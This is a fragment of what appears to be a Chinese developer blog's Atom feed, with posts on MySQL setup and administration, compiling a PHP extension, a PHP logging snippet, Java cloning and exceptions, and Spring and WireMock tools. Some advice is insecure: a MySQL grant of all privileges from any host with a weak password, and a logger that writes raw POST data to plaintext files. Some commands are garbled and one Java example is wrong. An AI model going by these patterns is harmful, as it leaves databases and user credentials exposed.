        <content type="html"><![CDATA[<h2 id="首先检查系统中是否已经安装了MySQL"><a href="#首先检查系统中是否已经安装了MySQL" class="headerlink" title="首先检查系统中是否已经安装了MySQL"></a>首先检查系统中是否已经安装了MySQL</h2><p>在终端里面输入 sudo netstat -tap | grep mysql</p><p>若没有反映，没有显示已安装结果，则没有安装。若如下显示，则表示已经安装</p><h2 id="如果没有安装，则安装MySQL"><a href="#如果没有安装，则安装MySQL" class="headerlink" title="如果没有安装，则安装MySQL."></a>如果没有安装，则安装MySQL.</h2><p>在终端输入 sudo apt-get install mysql-server mysql-client</p><p>在此安装过程中会让你输入root用户(管理MySQL数据库用户，非Linux系统用户)密码，按照要求输入即可。如下所示：</p><h2 id="测试安装是否成功："><a href="#测试安装是否成功：" class="headerlink" title="测试安装是否成功："></a>测试安装是否成功：</h2><p>在终端输入 sudo netstat -tap | grep mysql</p><h2 id="也可通过登录MySQL测试"><a href="#也可通过登录MySQL测试" class="headerlink" title="也可通过登录MySQL测试"></a>也可通过登录MySQL测试</h2><p>在终端输入 mysql -uroot -p 接下来会提示你输入密码，输入正确密码，即可进入。如下所示：</p><h2 id="MySQL的一些简单管理："><a href="#MySQL的一些简单管理：" class="headerlink" title="MySQL的一些简单管理："></a>MySQL的一些简单管理：</h2><p>启动MySQL服务： ssudo /etc/init.d/mysql start</p><p>停止MySQL服务： sudo /etc/init.d/mysql stop</p><p>修改 MySQL 的管理员密码： sudo mysqladmin -u root password newpassword</p><p>设置远程访问(正常情况下，mysql占用的3306端口只是在IP 127.0.0.1上监听，拒绝了其他IP的访问（通过netstat可以查看到）。取消本地监</p><p>听需要修改 my.cnf 文件：)：</p><p>sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf</p><p>bind-address = 127.0.0.1 //找到此内容并且注释</p><h2 id="MySQL安装后的目录结构分析-此结构只针对于使用apt-get-install-在线安装情况-："><a href="#MySQL安装后的目录结构分析-此结构只针对于使用apt-get-install-在线安装情况-：" class="headerlink" title="MySQL安装后的目录结构分析(此结构只针对于使用apt-get install 在线安装情况)："></a>MySQL安装后的目录结构分析(此结构只针对于使用apt-get install 在线安装情况)：</h2><p>数据库存放目录： /var/lib/mysql/</p><p>相关配置文件存放目录： /usr/share/mysql</p><p>相关命令存放目录： /usr/bin(mysqladmin mysqldump等命令)</p><p>启动脚步存放目录： /etc/rc.d/init.d/</p><h2 id="MySQL图形化管理软件"><a href="#MySQL图形化管理软件" class="headerlink" title="MySQL图形化管理软件"></a>MySQL图形化管理软件</h2><p>一般使用的有两个比较好，一个开源，一个商业收费：</p><p>开源：MySQL Workbench （具体使用介绍随着我的使用，我会慢慢总结）</p><p>商业：Navicat （收费的，有30天体验，之后我相信大家会有办法的）</p><h2 id="开启bin-log-日志"><a href="#开启bin-log-日志" class="headerlink" title="开启bin log 日志"></a>开启bin log 日志</h2>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP拓展Linux/unix 下的编译安装</title>
      <link href="/php/php/PHP-extension/"/>
      <url>/php/php/PHP-extension/</url>
      
        <content type="html"><![CDATA[<p>在Linux下PHP如果出现了拓展不能被安装的情况时,需要自己安装拓展。</p><p>一般来说需要安装相应系统库:比如libmcrypt和相应的拓展.so文件,下面使用mycrypt作为例子</p><p>MCrypt是一个功能强大的加密算法扩展库，它包括有22种算法。</p><p>1:下载并解压mcrypt-2.6.8.tar.bz2。（2.6.8为版本号，可以自行选择，但是注意后边步骤要与下载的版本号一致。）<br>2:在终端执行命令（注意如下命令需要安装xcode支持）：</p><pre><code>cd ~/Downloads/mcrypt-2.5.8./configure --disable-posix-threads --enable-staticmakesudo make install</code></pre><p><em>实际上这一步在Ubuntu上可以使用 apt-get 工具安装,在Mac上使用homebrew安装</em></p><p>3：下载并解压php源码，根据自己情况选择对应版本。(注意以下命令中php的版本)<br>在终端执行命令：（如果出错请看后边）</p><pre><code>cd ~/Downloads/php-5.5.14/ext/mcryptphpize./configuremakecd modulessudo cp mcrypt.so /usr/lib/php/extensions/no-debug-non-zts-20121212///上面可以使用make install 代替</code></pre><p>（cd modules后当出现</p><p>Build complete.<br>Don’t forget to run ‘make test’.<br>表示安装成功。）</p><p>*</p><p>直接安装拓展<br><a href="https://stackoverflow.com/questions/24749950/error-no-available-formula-for-php54-mcrypt-on-mac-os-x-mavericks" target="_blank" rel="noopener">https://stackoverflow.com/questions/24749950/error-no-available-formula-for-php54-mcrypt-on-mac-os-x-mavericks</a></p><p>*</p><p>4：打开php.ini</p><pre><code>sudo vi /etc/php.ini</code></pre><p>添加如下代码：（注意no-debug-non-zts-20121212版本号，如果不清楚可以前往/usr/lib/php/extensions/查看）</p><p>extension=/usr/lib/php/extensions/no-debug-non-zts-20121212/mcrypt.so<br>*如果phpize出现如下错误：</p><p>grep: /usr/include/php/main/php.h: No such file or directory<br>grep: /usr/include/php/Zend/zend_modules.h: No such file or directory<br>grep: /usr/include/php/Zend/zend_extensions.h: No such file or directory<br>Configuring for:<br>PHP Api Version:<br>Zend Module Api No:<br>Zend Extension Api No:<br>Cannot find autoconf. Please check your autoconf installation and the<br>$PHP_AUTOCONF environment variable. Then, rerun this script.<br>表示需要安装autoconf</p><p>*如果make出现如下错误：</p><p>/ext/mcrypt/mcrypt.c:25:10: fatal error: ‘php.h’ file not found<br>执行如下命令即可：</p><pre><code>sudo ln -s /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.10.sdk/usr/include /usr/include</code></pre><p><em>注意MacOSX10.10.sdk修改为自己系统的版本号</em></p><p>如果遇到<br>Configuring for:<br>PHP Api Version:         20121113<br>Zend Module Api No:      20121212<br>Zend Extension Api No:   220121212<br>Cannot find autoconf. Please check your autoconf installation and the<br>$PHP_AUTOCONF environment variable. Then, rerun this script.</p><p>参考:<a href="https://stackoverflow.com/questions/31583646/cannot-find-autoconf-please-check-your-autoconf-installation-xampp-in-centos" target="_blank" rel="noopener">https://stackoverflow.com/questions/31583646/cannot-find-autoconf-please-check-your-autoconf-installation-xampp-in-centos</a></p><p>For CentOS:</p><blockquote><h1 id="yum-install-autoconf"><a href="#yum-install-autoconf" class="headerlink" title="yum install autoconf"></a>yum install autoconf</h1></blockquote><p>for Ubuntu :</p><blockquote><h1 id="apt-get-install-autoconf"><a href="#apt-get-install-autoconf" class="headerlink" title="apt-get install autoconf"></a>apt-get install autoconf</h1></blockquote><p>for fedora 24-27:</p><blockquote><h1 id="dnf-install-autoconf"><a href="#dnf-install-autoconf" class="headerlink" title="dnf install autoconf"></a>dnf install autoconf</h1></blockquote><p>For Mac</p><blockquote><p>brew install autoconf</p></blockquote><p>对于Mac系统遇到 /etc/权限问题</p><p>参考:<a href="https://apple.stackexchange.com/questions/208815/error-configuring-mcrypt-after-upgrading-to-el-capitan" target="_blank" rel="noopener">https://apple.stackexchange.com/questions/208815/error-configuring-mcrypt-after-upgrading-to-el-capitan</a></p><p>我们可以安装到另外的地方</p><pre><code>sudo make EXTENSION_DIR=&#39;/usr/local/lib/php/extensions&#39; install</code></pre><h3 id="更多Mac的安全策略"><a href="#更多Mac的安全策略" class="headerlink" title="更多Mac的安全策略"></a>更多Mac的安全策略</h3><p>在最新的OSX中限制用户访问某些系统目录<br><a href="https://developer.apple.com/library/content/documentation/Security/Conceptual/System_Integrity_Protection_Guide/Introduction/Introduction.html" target="_blank" rel="noopener">https://developer.apple.com/library/content/documentation/Security/Conceptual/System_Integrity_Protection_Guide/Introduction/Introduction.html</a></p><p>无法访问的地址</p><pre><code>/bin/sbin/usr/System</code></pre><pre><code>/usr/local/Applications/Library~/Library</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一段简单的PHP 日志代码</title>
      <link href="/php/php/simple-log-feature/"/>
      <url>/php/php/simple-log-feature/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">&lt;?phpdefine(&quot;SEPARATOR&quot;,&quot; | &quot;);define(&quot;BASE_FILE_NAME&quot;,__DIR__.&quot;/../log/log.txt&quot;);file_put_contents(BASE_FILE_NAME,&quot;\n&quot;.date(&quot;Y-m-d h:i:s&quot;).    SEPARATOR.$_SERVER[&#39;PHP_SELF&#39;].SEPARATOR.    str_replace(&quot;\n&quot;,&quot;&quot;,json_encode($_POST) ),    FILE_APPEND);// 转存日志文件$currentDayFileName = __DIR__.&quot;/../log/&quot;.date(&quot;Y-m-d&quot;,time()-60*60*24).&quot;_log.txt&quot;;if(!file_exists($currentDayFileName)){    file_put_contents($currentDayFileName,file_get_contents(BASE_FILE_NAME));    file_put_contents(BASE_FILE_NAME,&quot;&quot;);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 对象克隆</title>
      <link href="/java/java/java-object-clone/"/>
      <url>/java/java/java-object-clone/</url>
      
        <content type="html"><![CDATA[<p>Java变量赋值对于简单变量来说没有什么特别的,对于对象来说有几种情况,</p><ul><li>shallow 赋值</li><li>深拷贝</li><li>克隆</li></ul><h4 id="shallow-赋值"><a href="#shallow-赋值" class="headerlink" title="shallow 赋值"></a>shallow 赋值</h4><p>这种赋值情况为共享内存空间,多个变量指向同一个地址空间</p><pre><code class="java">Object obj1 = new Object();Object obj2 = obj1;</code></pre><p>这里的obj1 和 obj2 共享内存空间, 修改其中一个会导致另外一个对象发生变化。</p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p>递归复制对象中所有的成员变量</p><pre><code class="java">Object obj1 = new Object();obj1.a = 1;Object obj2 = new Object();obj2.a = obj1.a;</code></pre><h4 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h4><p>使用对象的clone方法</p><pre><code class="Java">Person p = new Person(23, &quot;zhang&quot;);Person p1 = (Person) p.clone();System.out.println(p);System.out.println(p1);</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web project 概览</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-project-structure/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-project-structure/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Java 基础重点回顾</p><ul><li>注解</li><li>异常</li></ul></li><li><p>J2EE 开发常用版本</p><ul><li>Jar 引入Tomcat的J2EE的实现</li><li>J2EE 1.7</li><li>JDK 8</li><li>Tomcat 1.7</li></ul></li><li><p>Spring framework</p><ul><li>Beans</li><li>周边生态</li><li>项目配置 web.xml</li><li>页面渲染<ul><li>JSP</li><li>Velocity</li><li>FreeMaker</li><li>themleaf</li></ul></li></ul></li><li><p>ORM</p><ul><li>Mybatis<ul><li>DAO 接口<ol><li>DTO</li><li>PO</li></ol></li><li>Domain 或者 Model  实体类和数据库对应</li><li>Mapper 使用xml实现和数据库</li></ul></li><li>Hibernate</li><li>Querydsl ORM增强查询工具</li></ul></li><li><p>Validation</p><ul><li>Hibernate Validation 实现</li><li>Java EE Validation 实现</li></ul></li><li><p>授权验证/登录</p><ol><li>intercept 实现</li><li>sharon</li><li>Spring security</li></ol></li><li><p>部署</p><ol><li>tomcat 1.7</li></ol></li><li><p>日志</p><ol><li>log4J</li><li>self4J</li></ol></li><li><p>构建工具</p><ol><li>Maven</li><li>Gradle</li></ol></li><li><p>mapping 工具</p><ol><li>orika</li><li>object mapper</li></ol></li><li><p>其他工具库</p><ol><li>poi 微软文档API</li><li>guava Google工具库</li><li>commons-lang apache 字符串工具</li><li>quartz 计划任务</li></ol></li><li><p>Restful</p><ol><li>hateoas</li><li>jersey </li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 基本管理命令</title>
      <link href="/mysql/mysql/mysql-baisc%20operation/"/>
      <url>/mysql/mysql/mysql-baisc%20operation/</url>
      
        <content type="html"><![CDATA[<p>一、从命令行登录MySQL数据库服务器 1、登录使用默认3306端口的MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p</p><p>2、通过TCP连接管理不同端口的多个MySQL（注意：MySQL4.1以上版本才有此项功能）</p><p>/usr/local/mysql/bin/mysql -u root -p –protocol=tcp –host=localhost –port=3307</p><p>3、通过socket套接字管理不同端口的多个MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p –socket=/tmp/mysql3307.sock</p><p>4、通过端口和IP管理不同端口的多个MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p -P 3306 -h 127.0.0.1</p><hr><p>二、数据库操作SQL语句 1、显示服务器上当前存在什么数据库</p><p>SHOW DATABASES;</p><p>2、创建名称为rewin的数据库</p><p>CREATE DATABASE rewin DEFAULT CHARACTER SET utf8 ;</p><p>3、删除名称为rewin的数据库</p><p>DROP DATABASE rewin;</p><p>4、选择rewin数据库</p><p>USE rewin;</p><hr><p>三、表操作SQL语句（登录之后必须用以上的USE命令选择一个数据库，再进行表操作） 1、显示当前数据库中存在什么表</p><p>SHOW TABLES;</p><p>2、创建数据库表zhangyan：在mysql&gt;后粘贴以下SQL语句，存储引擎为MYISAM，字段id为主键、唯一索引</p><p>。</p><p>CREATE TABLE <code>zhangyan</code> ( <code>id</code> INT( 5 ) UNSIGNED NOT NULL AUTO_INCREMENT , <code>username</code> VARCHAR( 20 ) NOT NULL , <code>password</code> CHAR( 32 ) NOT NULL , <code>time</code> DATETIME NOT NULL , <code>number</code> FLOAT( 10 ) NOT NULL , <code>content</code> TEXT NOT NULL , PRIMARY KEY ( <code>id</code> ) ) ENGINE = MYISAM ;</p><p>3、查看zhangyan表结构</p><p>DESCRIBE zhangyan;</p><p>4、从表中检索信息 4.1、从zhangyan表中检索所有记录</p><p>SELECT * FROM zhangyan;</p><p>4.2、从zhangyan表中检索特定的行：字段username等于abc，字段number等于1，按字段id降序排列</p><p>SELECT * FROM zhangyan WHERE username = abc AND number=1 ORDER BY id DESC;</p><p>4.3、从zhangyan表中检索指定的字段：username和password</p><p>SELECT username, password FROM zhangyan;</p><p>4.4、从zhangyan表中检索出唯一的不重复记录：</p><p>SELECT DISTINCT username FROM zhangyan;</p><p>5、插入信息到zhangyan表</p><p>INSERT INTO zhangyan (id, username, password, time, number, content) VALUES (, abc, 123456,</p><p>2007-08-06 14:32:12, 23.41, hello world);</p><p>6、更新zhangyan表中的指定信息</p><p>UPDATE zhangyan SET content = hello china WHERE username = abc;</p><p>7、删除zhangyan表中的指定信息</p><p>DELETE FROM zhangyan WHERE id = 1;</p><p>8、清空zhangyan表</p><p>DELETE FROM zhangyan;</p><p>9、删除zhangyan表</p><p>DROP TABLE zhangyan;</p><p>10、更改表结构，将zhangyan表username字段的字段类型改为CHAR(25)</p><p>ALTER TABLE zhangyan CHANGE username username CHAR(25);</p><p>11、将当前目录下的mysql.sql导入数据库</p><p>SOURCE ./mysql.sql;</p><hr><p>四、数据库权限操作SQL语句 </p><p>1、创建一个具有root权限，可从任何IP登录的用户sina，密码为zhangyan</p><p>GRANT ALL PRIVILEGES ON <em>.</em> TO sina@% IDENTIFIED BY zhangyan;</p><p>2、创建一个具有”数据操作”、”结构操作”权限，只能从192.168.1.***登录的用户sina，密码为zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE , FILE , CREATE , DROP , INDEX , ALTER , CREATE</p><p>TEMPORARY TABLES , CREATE VIEW , SHOW VIEW , CREATE ROUTINE, ALTER ROUTINE, EXECUTE ON</p><p><em>.</em> TO <a href="mailto:sina@192.168.1" target="_blank" rel="noopener">sina@192.168.1</a>.% IDENTIFIED BY zhangyan;</p><p>3、创建一个只拥有”数据操作”权限，只能从192.168.1.24登录，只能操作rewin数据库的zhangyan表的用户</p><p>sina，密码为zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE ON  rewin.zhangyan TO <a href="mailto:sina@192.168.1.24" target="_blank" rel="noopener">sina@192.168.1.24</a> IDENTIFIED BY</p><p>zhangyan;</p><p>4、创建一个拥有”数据操作”、”结构操作”权限，可从任何IP登录，只能操作rewin数据库的用户sina，密码为</p><p>zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE , CREATE , DROP , INDEX , ALTER , CREATE TEMPORARY</p><p>TABLES , CREATE VIEW , SHOW VIEW , CREATE ROUTINE, ALTER ROUTINE, EXECUTE ON rewin.* TO</p><p>sina@% IDENTIFIED BY zhangyan;</p><p>5、删除用户</p><p>DROP USER sina@%;</p><p>6.MySQL中将字符串aaa批量替换为bbb的SQL语句</p><p>UPDATE 表名 SET 字段名 = REPLACE (字段名, aaa, bbb);</p><p>7.修复损坏的表       ①、用root帐号从命令行登录MySQL： 　　     mysql -u root -p</p><p>　　②、输入root帐号的密码。</p><p>　　③、选定数据库名（本例中的数据库名为student）： 　　use student;</p><p>　　④、修复损坏的表（本例中要修复的表为smis_user_student）： 　　repair table smis_user_student;udent;</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 学习指南</title>
      <link href="/Spring/spring/Spring%20boot%20Basic/"/>
      <url>/Spring/spring/Spring%20boot%20Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Spring-boot"><a href="#什么是Spring-boot" class="headerlink" title="什么是Spring boot"></a>什么是Spring boot</h2><p>Spring boot是一个基于Spring、Spring MVC的开发框架，特点是约定大于配置，使用Jar和内嵌容器的方式运行。</p><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul><li>Spring boot原理：<a href="http://blog.csdn.net/liaokailin/article/category/5765237" target="_blank" rel="noopener">http://blog.csdn.net/liaokailin/article/category/5765237</a></li></ul><h2 id="Spring-boot原理的个人理解"><a href="#Spring-boot原理的个人理解" class="headerlink" title="Spring boot原理的个人理解"></a>Spring boot原理的个人理解</h2><ul><li>内嵌Tomcat，使用JAR包部署，和一般java应用一致，不再使用web容器的方式编写代码</li><li>在使用Spring boot中非常不解的一件事是为什么可以直接引入包就可以使用，因为Spring boot有自动化配置的方式，常用的配置被定义在在autoconfigure这个包下，可以使用@Config注解来覆盖</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>java 异常</title>
      <link href="/java/java/java-exception/"/>
      <url>/java/java/java-exception/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是异常和错误"><a href="#什么是异常和错误" class="headerlink" title="什么是异常和错误"></a>什么是异常和错误</h4><p>异常和错误都会阻止当前方法或作用域继续执行,但是异常最大的特点是可以被handle,<br>这是异常和错误最大的区别。</p><p>异常(exception)的例子:</p><ul><li>数据库链接失败</li><li>网络中断</li></ul><p>错误(errors)的例子:</p><ul><li>内存溢出</li><li>CPU超时</li></ul><p>异常可以被捕获然后进行处理,比如渲染错误页面。错误会导致程序直接退出或崩溃。</p><h4 id="Java中的Exception"><a href="#Java中的Exception" class="headerlink" title="Java中的Exception"></a>Java中的Exception</h4><p>Throwable 类是 Java 语言中所有错误或异常的超类（这就是一切皆可抛的东西）。它有两个子类：Error和Exception。</p><p>Error：用于指示合理的应用程序不应该试图捕获的严重问题。这种情况是很大的问题，大到你不能处理了，所以听之任之就行了，你不用管它。比如说VirtualMachineError：当 Java 虚拟机崩溃或用尽了它继续操作所需的资源时，抛出该错误。好吧，就算这个异常的存在了，那么应该何时，如何处理它呢？？交给JVM吧，没有比它更专业的了。</p><p>Exception：它指出了合理的应用程序想要捕获的条件。Exception又分为两类：一种是CheckedException，一种是UncheckedException。这两种Exception的区别主要是CheckedException需要用try…catch…显示的捕获，而UncheckedException不需要捕获。通常UncheckedException又叫做RuntimeException。《effective java》指出：对于可恢复的条件使用被检查的异常（CheckedException），对于程序错误（言外之意不可恢复，大错已经酿成）使用运行时异常（RuntimeException）。</p><p>常见的RuntimeExcepiton有IllegalArgumentException、IllegalStateException、NullPointerException、IndexOutOfBoundsException</p><h4 id="异常的捕获"><a href="#异常的捕获" class="headerlink" title="异常的捕获"></a>异常的捕获</h4><p>一个数组越界的例子</p><pre><code class="java">    try {        System.out.println(ints[4]);        System.out.println(&quot;是否还能执行&quot;);// 发生异常以后，后面的代码不能被执行    } catch (IndexOutOfBoundsException e) {        System.out.println(&quot;数组越界错误&quot;);    }    System.out.println(&quot;异常出现后&quot;);</code></pre><p><strong>catch 规则: 可以使用多个catch 一旦捕获到的类型同样的或者它的父类就停止捕获。</strong><br>根据这个经验我们都需要把特定的一样类放到前面,最后一个catch用一个基本类型来捕获。</p><p>比如 IOException 是FileNotFoundException 的父类,如果FileNotFoundException产生但是产生了其他<br>IOException的异常</p><pre><code class="java">public void readFile() {    BufferedReader reader = null;    try {        try {            reader = new BufferedReader(new InputStreamReader(                    new FileInputStream(&quot;file&quot;)));            // do some other work            // close reader        } finally {            reader.close();        }    } catch (FileNotFoundException e) {        e.printStackTrace();    } catch (IOException e) {        e.printStackTrace();    }}</code></pre><h4 id="异常链"><a href="#异常链" class="headerlink" title="异常链"></a>异常链</h4><p>丢出新的异常时避免丢失旧的异常,需要把旧的异常放入新的异常链中</p><p>c.initCause(e);</p><pre><code class="java">public class NeverCaught {    static void f() throws ExceptionB{        throw new ExceptionB(&quot;exception b&quot;);    }    static void g() throws ExceptionC {        try {            f();        } catch (ExceptionB e) {            ExceptionC c = new ExceptionC(&quot;exception a&quot;);            //异常连            c.initCause(e);            throw c;        }    }    public static void main(String[] args) {            try {                g();            } catch (ExceptionC e) {                e.printStackTrace();            }    }}/*exception.ExceptionCat exception.NeverCaught.g(NeverCaught.java:12)at exception.NeverCaught.main(NeverCaught.java:21)Caused by: exception.ExceptionBat exception.NeverCaught.f(NeverCaught.java:5)at exception.NeverCaught.g(NeverCaught.java:10)... 1 more*/</code></pre><h4 id="运行时异常和检查异常"><a href="#运行时异常和检查异常" class="headerlink" title="运行时异常和检查异常"></a>运行时异常和检查异常</h4><p>检查异常:编译时期比如处理的异常,比如FileNotFoundException,<br>比如使用try catch捕获。</p><p>运行时异常:可以不用处理,最终jvm会处理的异常。比如NullPointerException</p><h4 id="throw、throws"><a href="#throw、throws" class="headerlink" title="throw、throws"></a>throw、throws</h4><p>throws: 当我们遇到检查异常时,如果不想在方法内处理,可以加上throws关键字,然上一级方法调用者<br>检查,throws会抛出所有检查异常。</p><p>throw:在方法内部抛出一个异常。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java CMS 选型</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/cms%20in%20java/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/cms%20in%20java/</url>
      
        <content type="html"><![CDATA[<h2 id="技术要求"><a href="#技术要求" class="headerlink" title="技术要求"></a>技术要求</h2><p>SpringMVC+Mybatis+freemarker/JSP</p><h2 id="通用后台快速开发方案"><a href="#通用后台快速开发方案" class="headerlink" title="通用后台快速开发方案"></a>通用后台快速开发方案</h2><ul><li><a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></li><li><a href="https://github.com/kanwangzjm/funiture" target="_blank" rel="noopener">https://github.com/kanwangzjm/funiture</a></li></ul><h2 id="成品CMS方案"><a href="#成品CMS方案" class="headerlink" title="成品CMS方案"></a>成品CMS方案</h2><ul><li><a href="http://www.tjpcms.com" target="_blank" rel="noopener">http://www.tjpcms.com</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mock工具 wiremock</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Wiremock%20for%20java/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Wiremock%20for%20java/</url>
      
        <content type="html"><![CDATA[<p>Wiremock 是一个Java环境中的Mock工具，非常容易和Junit等单元测试框架集成。</p><h2 id="The-JUnit-4-x-Rule"><a href="#The-JUnit-4-x-Rule" class="headerlink" title="The JUnit 4.x Rule"></a>The JUnit 4.x Rule</h2><p>在JUnit4中可以使用Rule的注解，来直接启动</p><pre><code class="java">@Rulepublic WireMockRule wireMockRule = new WireMockRule(options().port(8888).httpsPort(8889));</code></pre><h2 id="standalone-模式"><a href="#standalone-模式" class="headerlink" title="standalone 模式"></a>standalone 模式</h2><p>这种模式可以使用Wiremock提供的jar运行文件直接启动。</p><blockquote><p>java -jar wiremock-standalone-2.11.0.jar</p></blockquote><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>可以使用录制模式来获取以后Mock的数据</li><li>如果遇到HTTPS需要配置certificate</li><li>更多信息查看文档 <a href="http://wiremock.org/docs/" target="_blank" rel="noopener">http://wiremock.org/docs/</a></li></ol><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><p>官网</p><p><a href="http://wiremock.org/" target="_blank" rel="noopener">http://wiremock.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jeeweb - SpringMVC+Spring+Hibernate 项目模板</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Jeeweb%20-%20Java%20boilerplate/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Jeeweb%20-%20Java%20boilerplate/</url>
      
        <content type="html"><![CDATA[<p>JeeWeb是一款基于SpringMVC+Spring+Hibernate的敏捷开发系统, 实际上是一个种子项目,但是用来开发CRUD项目绰绰有余了。</p><p>项目地址:<a href="https://www.oschina.net/p/jeeweb" target="_blank" rel="noopener">https://www.oschina.net/p/jeeweb</a><br>github地址:<a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></p><p>通过学习这个项目,可以学习Java基本的基本选型和配置。<br>技术选型参考如下:</p><h2 id="JeeWeb-功能特点"><a href="#JeeWeb-功能特点" class="headerlink" title="JeeWeb 功能特点"></a>JeeWeb 功能特点</h2><ul><li>采用SpringMVC+Spring+Hibernate+Shiro+ Ehcache+Disruptor+Jquery + Boostrap + Ztree等基础前后端架构架构</li><li>采用面向声明的开发模式， 基于泛型编写极少代码即可实现复杂的数据展示、数据编辑、表单处理等功能，在不使用代码生成器的情况下，也只需要很少的代码就能实现基础的CURD操作，再配合在线开发与代码生成器的使用，更加加快了开发的进度，将J2EE的开发效率成本提高，可以将代码减少60%以上。</li><li>在线开发(通过在线配置实现一个表模型的增删改查功能，无需一行代码，支持用户自定义表单布局)</li><li>代码生成器，支持多种数据模型,根据表生成对应的Entity,Service,Dao,Controller,JSP等,增删改查功能生成直接使用</li><li>UI标签开发库，针对前端UI进行标准封装表，页面统一采用UI标签实现功能：数据datagrid,treegrid,FileInput,Editor,GridSelect等，实现JSP页面零JS，开发维护简洁高效</li><li>查询过滤器：只需前端配置，后台动态拼SQL追加查询条件；支持多种匹配方式（全匹配/模糊查询/包含查询/不匹配查询）</li><li>移动平台支持，对Bootstrap(兼容Html5)进行标准封装</li><li>国际化（支持多语言，国际化的封装为多语言做了便捷支持）</li><li>多数据源（在线配置数据源，数据源工作类封装）</li><li>数据权限：整合Shiro权限</li><li>计划任务控制（在线配置计划任务、方便计划任务的时间调整规划）</li><li>邮件发送（配置邮件模版、邮件帐号的在线配置、邮件异步发送、邮件发送日志功能统计）</li><li>短信发送（配置短信模版、短信帐号的在线配置、短信异步发送、短信发送日志功能统计、支持短信发送平台动态切换）</li><li>多种首页风格切换,支持自定义首页风格。（Inspinia风格|ACE风格）</li><li>数据统计报表：丰富的报表统计功能</li><li>支持多种浏览器: Google, 火狐, IE,360 等</li><li>支持数据库: Mysql,Oracle10g,SqlServer等</li><li>基础权限: 用户，角色，菜单权限</li><li>Web容器测试通过的有Jetty和Tomcat,Weblogic</li><li>要求JDK1.7+</li></ul><h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h1><p>1、后端</p><ul><li>核心框架：Spring Framework</li><li>安全框架：Apache Shiro</li><li>视图框架：Spring MVC</li><li>服务端验证：Hibernate Validator</li><li>布局框架：SiteMesh</li><li>任务调度：Quartz</li><li>持久层框架：Hibernate</li><li>数据库连接池：Alibaba Druid</li><li>缓存框架：Ehcache</li><li>并发框架：Disruptor</li><li>日志管理：SLF4J、Log4j</li><li>工具类：Apache Commons、Jackson、Xstream、</li></ul><p>2、前端</p><ul><li>JS框架：jQuery。</li><li>CSS框架：Twitter Bootstrap</li><li>客户端验证：Validform。</li><li>富文本在线编辑：markdown、simditor、Summernote、CodeMirror自由切换</li><li>文件上传工具:Bootstrap fileinput</li><li>数据表格：jqGrid</li><li>对话框：layer</li><li>树结构控件：jQuery zTree</li><li>日期控件： datepicker</li><li>代码高亮： syntaxhighlighter</li></ul><h2 id="简单使用说明"><a href="#简单使用说明" class="headerlink" title="简单使用说明"></a>简单使用说明</h2><ul><li>导入sql/jeeweb-mysql-v1.0.sql文件到mysql数据库</li><li>导入项目到Eclipse.</li><li>修改数据库配置文件dbconfig.properties中的账号密码.</li><li>启动项目,管理员账号admin/密码123456</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web工程师知识图谱</title>
      <link href="/java/java/Java%20kills%20map/"/>
      <url>/java/java/Java%20kills%20map/</url>
      
